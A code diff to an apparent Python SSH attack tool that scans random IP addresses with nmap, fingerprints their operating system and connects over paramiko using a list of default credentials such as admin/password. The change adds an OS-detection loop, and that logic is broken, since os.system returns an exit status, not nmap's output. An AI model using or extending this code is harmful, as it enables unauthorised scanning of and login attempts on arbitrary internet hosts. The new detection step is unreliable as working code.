@@ -4,6 +4,7 @@ import nmap
 import random
 import os
 import paramiko
+import re
 
 
 default = [("ubuntu", ""), ("admin", "password")]
@@ -42,8 +43,12 @@ def generate_ip():
 
 
 def init_tunnel():
-    ip = generate_ip()
     ssh = paramiko.SSHClient()
+    pat = re.compile("Linux")
+    ip = generate_ip()
+    ops = os.system('nmap -O -Pn ' + ip)
+    while re.search(pat, str(ops)) != None:
+        ip = generate_ip()
     tunnel(ssh, ip)
     ssh.close()
 
